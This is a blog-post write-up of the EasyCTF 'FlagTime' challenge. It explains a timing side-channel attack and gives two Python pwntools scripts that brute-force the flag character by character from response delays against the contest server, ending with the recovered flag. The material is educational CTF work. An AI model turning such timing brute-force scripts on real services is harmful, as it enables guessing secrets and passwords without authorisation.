---
layout: post
title: EasyCTF'17 - FlagTime writeup
date: 2018-02-24
---
## Description
`This problem is so easy, it can be solved in a matter of seconds. Connect to c1.easyctf.com:12482.`

## Thought process 

So the moment I read the title and description I knew it was something like a [Time-Based Blind SQL Injection](http://www.sqlinjection.net/time-based/){:target="_blank"}  

I began experimenting with different values to see if I could find a pattern ...

* It seems that when the character is wrong, the time taken for the reply is short
![wrong](https://thumbs.gfycat.com/BigBonyBeardedcollie-size_restricted.gif)

* while a correct character resulted in a slightly longer delay in the reply (2 seconds)
![right](https://thumbs.gfycat.com/UnhappyHorribleBichonfrise-size_restricted.gif)

* To test this theory, I tested the first part of the flag *(which is already known as the standard flag format)*
![easyctf{](https://thumbs.gfycat.com/EasygoingPassionateDungenesscrab-size_restricted.gif)
which took a total of 6 seconds, almost 1 second for each correct character 

#### After that I wrote a script to brute force the flag based on a known characterlist:

``` python
#!/usr/bin/python
from pwn import *

#send and receive response
def send_msg(msg):
	conn = remote("c1.easyctf.com",12482)
        conn.recv() #"enter the flag:"
        conn.sendline(msg)
        data = conn.recvuntil('\n')
        if not data.rstrip() == 'no':
		print(data)
		exit()

#returns the time taken for a particular string
def getTime(s):
	sum = 0
	for t in range(3):
		start = time.time()
		send_msg(s)
		diff = time.time() - start
		sum += diff
	sum = sum / 3
	return sum

#easyctf{e@o%
flag = "easyctf{e@o%Kx3b5"   #the flag is built by adding the "winner" of each round
chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}!@#$%^&*_-=+"
while True:
	
	buff = []

	#pick a new character to try
	for c in chars:
		timeDiff = getTime(flag+c)
		buff.append(timeDiff)

	#get the max of all times
	winner = max(buff)
	i = buff.index(winner)

	#add to flag
	flag += chars[i]
	print ">",flag
		
```
Unfortunately this script was not performing as I expected, due to this challenge being hosted in the United States, there is a lot of **fluctuation in RTT** (Round Trip Time) which affects the accuracy of the script, since the script only knows how to pick the character which took the longest time. Not only that, I tried to compensate for the fluctations by taking the average of 3 runs which wasted half a day and provided no benefit at all.

I left the script to run while working on other challenges and when I checked an hour later I got `easyctf{e@o%Kx3b5`, which is basically gibberish :confused:

#### As an example: 
![rip](https://media.giphy.com/media/fQoxpTahV2P21EVvFH/giphy.gif)

I heard others mentioning running their script from a server they rented from Amazon Web Services (located in the US) so I thought I could do the same, but then I remembered I ran out of free Digital Ocean credits and I also didn't want to spend my AWS credits on a challenge like this, so I left the challenge on hold until further notice ...

After a good night's rest, it suddenly came to me that EasyCTF did provide their own **shell server** that players could SSH into ! Why didn't I think of that sooner ? I revised my current script into a faster version and stuck it into the EasyCTF shell server.

I was pleasantly surprised to find that their shell server already had the *pwn* module pre-installed :D
Setting it up on my machine was quite painful but I did learn that `sudo -H pip install --upgrade <package>` solves pretty much everything ~

```python
#!/usr/bin/python
from pwn import *

#send and receive response
def send_msg(msg):
	conn = remote("c1.easyctf.com",12482)
        conn.recv() #"enter the flag:"
        conn.sendline(msg)
        data = conn.recvuntil('\n')
        if not data.rstrip() == 'no':
		print(data)
		exit()

#returns the time taken for a particular string
def getTime(s):
	start = time.time()
	send_msg(s)
	diff = time.time() - start
	return diff

flag = ""  #easyctf{ezx  (not sure if x or _ they seem close)
chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}!@$_"

while True:
	
	max = 0
	maxChar = None

	#pick a new character to try
	for c in chars:
		timeDiff = getTime(flag+c)
		print flag+c,"->",timeDiff
		if timeDiff > max:
			maxChar = c
			max = timeDiff

	#add to flag
	
	flag += maxChar
	print "====>",flag
```
It still wasn't as fast as I'd like, as the time delay in correct characters increases for each character, it became increasingly difficult to bruteforce. 

Based on the length of the characterlist I used : 
* Brute-forcing the first character (0.5 seconds for each reply) would need <u>38 seconds</u> for 1 whole round
* Brute-forcing the 10th character (10 seconds for each reply) would need **<u>12 minutes</u>** for 1 whole round :( 

So my strategy was to let the script brute force the flag whilst I did trial and error beside it at the same time
![many](https://i.imgur.com/INGYBPD.jpg)

Once parts of the flag were uncovered, the rest of the *word* would become trivially guessable                                      
eg. `easyctf{ez_t1m` **->** `easyctf{ez_timing` / `easyctf{ez_t1m1ng` or any variation of *"timing"*

In the end the flag was `easyctf{ez_t1m1ng_4ttack!}` :checkered_flag:

## Things I learnt from this challenge
* How to setup and use the pwn library (for connecting to ports/sockets) 
* This type of attack is called timing attack
* The effect of physical distance between networks that can affect results significantly 


Overall I'm pretty proud that out of 1000-over teams I was one of the first 120 to solve this challenge, although its a Miscallaneous challenge I definitely got a lot out of it ! 
